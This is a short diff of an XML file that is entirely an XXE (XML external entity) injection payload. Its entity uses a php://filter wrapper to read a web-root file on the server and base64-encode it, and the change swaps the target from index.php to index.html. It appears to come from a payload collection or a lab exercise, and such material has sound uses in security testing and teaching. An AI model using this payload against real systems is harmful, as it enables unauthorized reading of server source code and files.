@@ -1,4 +1,4 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">]>
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.html">]>
 <foo><result>&ac;</result></foo>
